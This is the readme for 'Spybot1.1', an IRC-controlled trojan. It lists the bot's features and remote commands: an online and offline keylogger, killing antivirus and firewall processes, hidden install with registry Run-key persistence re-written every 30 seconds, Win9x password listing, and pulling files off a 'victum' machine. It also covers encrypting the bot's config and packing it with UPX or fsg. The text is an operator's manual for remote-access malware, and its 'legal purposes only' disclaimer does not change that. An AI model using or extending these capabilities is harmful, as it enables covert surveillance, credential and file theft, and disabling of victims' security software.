//////////////////////////////////////////////////////////
//							//
//		Spybot1.1 by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//							//
//	 You can use this code however      		//
//       you want, as long as i'm given     		//
//       credit in some way.				//
//	 This is the first real c program i have        //
//	 made so there will be some bugs in it.         //
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////





Features: 

- Keylogger 
Online and offline keylogger the offline keyloggers only works if its set on in the source (settings.h)  
It shows the key that are pressed and the window where the were pressed. Some problems with upper and lowercase sometimes.

- List processes  
Shows al running processes. 
You can kill a process.

- AV/Firewall killer
Kills a program if its name is in the killlist (settings.h)

- DCC Send
You can send a file to the bot with the normal dcc send option in mIRC (only tested it with mIRC6.03 get it from www.mirc.com)

- Get File
Download a file from the bot’s pc I have made a special mIRC script for this (will only work with that script)

- DCC Chat
Just normal dcc chat option in mIRC all commands will also work here, use this if you want do giff a command that has a lot of output most irc servers will disconnect the bot if it sends a lot of data.

- List files
List al files and dirs within your sears query example list c:\windows\*.exe will list al .exe files in the windows dir

- Hostmask match login
When you do the login [password] commands the bot checks if your hostmask matches a hostmask in the trusted hosts list (settings.h). if not you cant login 

- Raw Commands (on connect and onjoin)
Bot reads a list of raw commands when its connected or joins a channel
Example:
On join:
	MODE $CHAN +nts
	MODE $CHAN +k trojanforge
On Connect
	MODE $NICK +I

- Install server and make sure the startupkeys are not removed
Install the server to systemdir and set file attributes to read-only system and hidden, option to melt the server (delete original filename).
The server will check every 30 sec. If the startupkeys are still there if not it will write new ones 
Keys are:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

- Computer info
Gives some pc info including ip address
 
- Topic commands
Option to gif the bot a command with the topic (when the bot joins the channel)

- Lists the passwords (only win 9x)
- Execute, delete, rename file And make dir
- Sendkeys 
- Open/close cd-rom
- Reboot pc
- Disconnect for x sec.
- Reconnect
- Quit 
- Raw commands
 




Commands list

Login password
raw [raw command]			(example: raw PRIVMSG #spybot1.1 :hello)
list [path+filter]	  		(example: list c:\*.*)
delete [filename]			(example: delete c:\windows\netstat.exe)
execute [filename]
rename [origenamfile] [newfile]		(example: rename c:\windows\netstat.exe c:\windows\netstatbackup.bak)
makedir [dirname]			(example: makedir c:\test\  )
startkeylogger 				(info: starts onlinekeylogger and output's to the channel\query\dcc chat)
stopkeylogger
sendkeys [keys]				(info: simulates keypresses, to simulate return hit ctrl+b (bold in mIRC) and for backspace ctrl+u (underlined in mIRC))
keyboardlights				(info: flashes his keyboard lights 50x)
info					(info: gives some info)
passwords				(info: lists the ras passwords in win 9x)
listprocesses				(info: lists all running proccesses)
killprocess [processname] 		(example: killprocess taskmgr.exe)   NOTE: if with listprocesses the entire path shows up you must use it with killprocess to)
reconnect
disconnect [sec.]			(info: disconnect the bot for x sec. if sec. is not given it disconnect the bot for 30mins.)
quit					(info: bot quits running)
reboot
cd-rom [0/1]				(info: opens\close cd-rom. cd-rom 1 = open cd-rom 0 = close)



DCC

DCC chat & DCC send works with any normal irc client in mIRC the command is: /dcc chat [nickname] and: dcc send [nickname]
for DCC get you must use the mirc script that is in the zipfile "spybot.mrc"
load it in mirc remotes /load -rs c:\unzipped\spybot1.1\spybot.mrc
and type /dccget [nickname] [filename] example: /dccget victum c:\windows\system\keylogs.dll
the file will be stored in the same dir as the script is 
MAKE SURE THE SAME FILENAME DOESNT EXISTS IN THAT DIR!! if its does exists the script will not warn you it just writes the new file at the end of the old 
the script is not telling you when the filetransfer is completed the bot does that
maybe some day i gonna make some userfriendly script for this :-)




Encryption

Support to encrypt the channel channelpass and loginpass So you can not just hexedit the server and see it in plain text
you must enable this option in spybot1.1.c
to encrypt the date use the mirc script type in mirc: 
/encrypt [encryptkey] [data]
example: /encrypt 81 #spybot
this will output: tÇÇÓ¿Ï×
it will copy the encrypted data to your clipboard
make sure the key is the same as the decryptkey in settings.h




Compiling

I have only test it with lcc-win32 if you dont have it download it from http://www.q-software-solutions.com
will probebly also work with VC++

if you have lcc just run "make spybot.bat" (make sure the lcc dir is c:\lcc\ )
You can pack it with UPX or fsg packer i use fsg and packet size is 10kb


If you found bugs or have question ask them on  www.trojanforge.net my nick there is Michie


Disclaimer

Spybot is meant to be used for legal purposes only.  Since it is beyond the author's control of what Spybot is used for, the author of Spybot can not be held accountable for anything you do with this source.



 